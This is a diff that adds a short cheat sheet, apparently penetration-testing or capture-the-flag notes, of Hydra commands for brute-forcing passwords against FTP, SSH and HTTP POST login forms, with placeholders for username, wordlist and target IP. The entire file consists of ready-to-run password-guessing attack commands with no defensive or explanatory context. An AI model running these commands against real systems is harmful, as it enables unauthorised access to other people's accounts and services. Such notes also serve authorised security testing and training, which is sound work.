@@ -1,0 +1,10 @@
+# crack ftp
+hydra -l [username] -P [wordlist] ftp://[target IP]
+
+# crack ssh, -t number of threads to use
+hydra -l [username] -P [wordlist] [target IP] -t 4 ssh
+
+# crack web
+# check post or get request
+# "[login page]:[request body]:[error message]"
+hydra -l [username] -P [wordlist] [target IP] http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
